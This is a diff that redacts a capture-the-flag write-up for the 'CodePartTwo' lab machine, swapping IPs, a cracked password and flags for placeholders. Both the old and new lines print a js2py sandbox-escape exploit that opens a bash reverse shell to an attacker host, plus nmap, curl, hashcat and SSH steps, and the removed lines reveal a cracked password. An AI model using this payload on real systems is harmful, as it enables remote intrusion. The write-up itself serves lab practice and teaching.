@@ -13,7 +13,6 @@
 | Attribute | Details |
 |-----------|---------|
 | **Machine Name** | CodePartTwo |
-| **IP Address** | 10.10.11.82 |
 | **Operating System** | Linux (Ubuntu 20.04) |
 | **Difficulty** | Easy |
 | **Key Vulnerabilities** | CVE-2024-28397 (js2py RCE), Weak password hashes, Sudo misconfiguration |
@@ -39,7 +38,7 @@
 Initial **nmap** scan to discover open ports:
 
 ```bash
-nmap -sC -sV -p- --min-rate 5000 10.10.11.82 -oN nmap_scan.txt
+nmap -sC -sV -p- --min-rate 5000 <TARGET_IP> -oN nmap_scan.txt
 ```
 
 **Results:**
@@ -62,7 +61,7 @@ PORT     STATE SERVICE VERSION
 
 ### Web Application Analysis
 
-Navigating to `http://10.10.11.82:8000` revealed:
+Navigating to `http://<TARGET_IP>:8000` revealed:
 - Login page
 - Registration functionality
 - **"Download App" button** ← Critical finding!
@@ -138,7 +137,7 @@ def run_code():
 #### Step 1: Test Endpoint Accessibility
 
 ```bash
-curl -X POST http://10.10.11.82:8000/run_code \
+curl -X POST http://<TARGET_IP>:8000/run_code \
   -H "Content-Type: application/json" \
   -d '{"code": "1 + 1"}'
 ```
@@ -157,15 +156,15 @@ Created `exploit.sh`:
 ```bash
 #!/bin/bash
 
-LHOST="10.10.14.51"  # Attacker IP
+LHOST="<ATTACKER_IP>"  # Attacker IP
 LPORT="6767"
-TARGET="http://10.10.11.82:8000/run_code"
+TARGET="http://<TARGET_IP>:8000/run_code"
 
 curl -X POST "$TARGET" \
   -H "Content-Type: application/json" \
   --data-binary @- << 'EOF'
 {
-  "code": "let cmd = 'bash -c \"bash -i >& /dev/tcp/10.10.14.51/6767 0>&1\"'; let getattr = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__; let obj = getattr(getattr, '__class__').__base__; function findpopen(o) { for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == 'subprocess' && item.__name__ == 'Popen') { return item; } } } findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();"
+  "code": "let cmd = 'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/6767 0>&1\"'; let getattr = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__; let obj = getattr(getattr, '__class__').__base__; function findpopen(o) { for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == 'subprocess' && item.__name__ == 'Popen') { return item; } } } findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();"
 }
 EOF
 ```
@@ -193,7 +192,7 @@ chmod +x exploit.sh
 **Result:**
 ```
 listening on [any] 6767 ...
-connect to [10.10.14.51] from (UNKNOWN) [10.10.11.82] 60172
+connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] [PORT]
 app@codeparttwo:~/app$
 ```
 
@@ -263,21 +262,21 @@ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 **Cracked Password:**
 ```
-649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
+[REDACTED_HASH]:[REDACTED_PASSWORD]
 ```
 
-✅ **Credentials:** `marco:sweetangelbabylove`
+✅ **Credentials:** `marco:[REDACTED_PASSWORD]`
 
 ### SSH Access as Marco
 
 ```bash
-ssh marco@10.10.11.82
-# Password: sweetangelbabylove
+ssh marco@<TARGET_IP>
+# Password: [REDACTED]
 ```
 
 ```bash
 marco@codeparttwo:~$ cat user.txt
-498b1aa54853a59973598b28f9dff4ee
+HTB{redacted}
 ```
 
 🚩 **User Flag Captured!**
@@ -386,7 +385,7 @@ uid=1000(marco) gid=1000(marco) euid=0(root) groups=1000(marco),1003(backups)
 
 ```bash
 rootbash-5.0# cat /root/root.txt
-[ROOT FLAG HERE]
+HTB{redacted}
 ```
 
 🚩 **Root Flag Captured!**
